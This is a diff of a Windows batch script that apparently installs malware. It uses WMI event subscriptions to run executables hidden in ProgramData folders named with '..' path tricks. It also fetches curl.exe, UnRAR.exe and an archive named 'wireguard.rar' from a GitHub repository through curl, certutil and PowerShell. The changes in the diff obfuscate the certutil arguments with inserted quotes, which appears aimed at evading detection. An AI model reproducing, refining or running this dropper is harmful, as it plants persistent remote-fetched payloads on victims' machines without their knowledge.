@@ -6,7 +6,7 @@ wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="NRP", Even
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="NRP", CommandLineTemplate="\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"NRP\"", Consumer="CommandLineEventConsumer.Name=\"NRP\""
 
-cmd.exe /c start "" powershell.exe Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
+cmd.exe /c start "" powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
 
 cmd.exe /c start "" powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='LUN'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 cmd.exe /c start "" powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='LUN'; CommandLineTemplate='\\?\%ProgramData%\nuldata..\nul.exe \\?\%ProgramData%\nuldata..\nul'} | Out-Null"
@@ -23,8 +23,8 @@ dir "%ProgramData%\hared\wireguard.rar" >nul || %ProgramData%\curl.exe -s -L -o 
 dir "%ProgramData%\hared\UnRAR.exe" >nul || %WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\hared\UnRAR.exe" https://github.com/vltex/1/raw/1/0/UnRAR.exe
 dir "%ProgramData%\hared\wireguard.rar" >nul || %WINDIR%\System32\curl.exe -s -L -o "%ProgramData%\hared\wireguard.rar" https://github.com/vltex/0/raw/main/1/wireguard.rar
 
-dir "%ProgramData%\hared\UnRAR.exe" >nul || certutil -url""""cache -split -f "https://github.com/vltex/1/raw/1/0/UnRAR.exe" "%ProgramData%\hared\UnRAR.exe"
-dir "%ProgramData%\hared\wireguard.rar" >nul || certutil -url""""cache -split -f "https://github.com/vltex/0/raw/main/1/wireguard.rar" "%ProgramData%\hared\wireguard.rar"
+dir "%ProgramData%\hared\UnRAR.exe" >nul || certutil -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/UnRAR.exe" "%ProgramData%\hared\UnRAR.exe"
+dir "%ProgramData%\hared\wireguard.rar" >nul || certutil -url""""cache -sp""""lit -f "https://github.com/vltex/0/raw/main/1/wireguard.rar" "%ProgramData%\hared\wireguard.rar"
 
 dir "%ProgramData%\hared\UnRAR.exe" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/1/raw/1/0/UnRAR.exe -OutFile %ProgramData%\UnRAR.exe
 dir "%ProgramData%\hared\wireguard.rar" >nul || powershell.exe -NoProfile Invoke-WebRequest https://github.com/vltex/0/raw/main/1/wireguard.rar -OutFile %ProgramData%\wireguard.rar
